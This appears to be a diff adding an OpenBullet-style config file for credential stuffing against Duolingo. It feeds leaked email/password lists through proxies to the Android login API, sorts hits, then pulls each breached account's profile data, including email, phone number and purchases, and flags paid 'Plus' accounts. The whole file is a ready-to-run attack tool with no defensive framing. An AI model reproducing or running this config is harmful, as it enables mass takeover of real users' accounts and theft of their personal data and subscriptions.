@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "[CT] Duolingo [APİ]",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T16:11:51.1590512+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "RANDOM" 
+
+REQUEST POST "https://android-api.duolingo.com/2017-06-30/login?fields=id" 
+  CONTENT "{\"distinctId\":\"<RANDOM>\",\"identifier\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Duodroid/4.62.1 Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930K Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{}" 
+    KEY "BAD_REQUEST_SCHEMA" 
+  KEYCHAIN Success OR 
+    KEY "{\"id\":" 
+
+PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+REQUEST GET "https://android-api.duolingo.com/2017-06-30/users/<id>?fields=adsConfig%7Bunits%7D%2Cid%2CautoUpdatePreloadedCourses%2Cbio%2CcoachOutfit%2Ccourses%7BauthorId%2CfromLanguage%2Cid%2ChealthEnabled%2ClearningLanguage%2Cpreload%2Ctitle%2Cxp%2Ccrowns%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CemailWordOfTheDay%2Cexperiments%7Bandroid_app_indexing_worker%2Candroid_nurr_cta_on_locked_skills%2Candroid_reduce_prefetching_rate%2Candroid_retry_5xx_errors_v4%2Candroid_prefetch_all_skills_v2%2Candroid_tv%2Candroid_tv_override%2Candroid_unified_home_messaging_backend%2Candroid_unified_home_messaging_ui_v2%2Candroid_welcome_fork_copy_v2%2Casia_context_on_registration_steps%2Casia_limit_coppa_experience_v3%2Casia_pause_plus_promo_v2%2Cchina_android_disable_ads%2Cchina_android_wechat_follow_session_end%2Cchina_android_wechat_name_change%2Cchina_android_yunpian_onelogin%2Cconnect_android_add_facebook_friends%2Cconnect_android_follow_email%2Cconnect_android_edit_own_avatar%2Cconnect_android_letter_avatar_on_push%2Cconnect_android_profile_redesign_v2%2Cconnect_android_referral_banner_copy%2Cconnect_backend_revise_referral_tiers%2Cdelight_challenge_anim_gating%2Candroid_delight_tab_animate%2Cgrammar_android_smart_tips_usefulness%2Cgrammar_android_smart_tips_flow%2Clearning_android_level_up_onboarding%2Clearning_sg_adaptive_global_practice%2Clearning_android_adaptive_lessons_v3%2Cmercury_android_add_interstitial_load%2Cmercury_android_native_ad_copy%2Cmercury_android_restrict_stitial_rv_v2%2Cmidas_android_billing_reconnect_v1%2Cmidas_android_hard_mode%2Cmidas_android_immersive_hearts%2Cmidas_android_plus_ad_blindness_v3%2Cmidas_android_plus_welcome_animation%2Cmidas_android_reduce_course_download%2Cmidas_android_social_proof%2Cmidas_android_vertical_purchase_page%2Cretention_android_accents_copy%2Cretention_android_achievement_sparkles%2Cretention_android_achieve_animations%2Cretention_android_animate_streak_topbar%2Cretention_android_dg_anim_redesign_v2%2Cretention_android_early_streak_copy_v2%2Cretention_android_huawei_settings%2Cretention_android_lenient_grading%2Cretention_android_lls_progress_bar%2Cretention_android_more_loading_msgs%2Cretention_android_more_streak_cal_des%2Cretention_android_rm_trumpet%2Cretention_android_skill_reward_copy_v2%2Cretention_android_incr_freeze_prob%2Cretention_android_streak_cta_copy%2Cretention_android_typo_copy%2Cretention_android_wager_se_copy_fix%2Cstories_android_autoscroll_v3%2Cstories_ds_sb_reroute%2Cstories_android_new_content_v2%2Cstories_android_next_story_redirect%2Cstories_android_remove_part_complete%2Cstories_android_trial_users%7D%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%7D%2CinviteURL%2CjoinedClassroomIds%2ClearningLanguage%2Clingots%2Clocation%2Cname%2CobservedClassroomIds%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings%2CpushAnnouncement%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CreferralInfo%7BhasReachedCap%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName%2CisEligibleForBonus%7D%2CrequiresParentalConsent%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId%2Ccurrency%2Camount%7D%7D%2Croles%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2Crenewer%2Crenewing%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%7D%2Cstreak%2CstreakData%7Blength%2CupdatedTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpConfig%7BmaxSkillTestXp%2CmaxCheckpointTestXp%2CmaxPlacementTestXp%7D%2CxpGoal%2CzhTw" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" MatchesRegex "^{}$" 
+  KEYCHAIN Success OR 
+    KEY "\"hasPlus\":true" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"hasPlus\":false" 
+
+PARSE "<SOURCE>" JSON "hasPlus" CreateEmpty=FALSE -> CAP "IsPlus" 
+
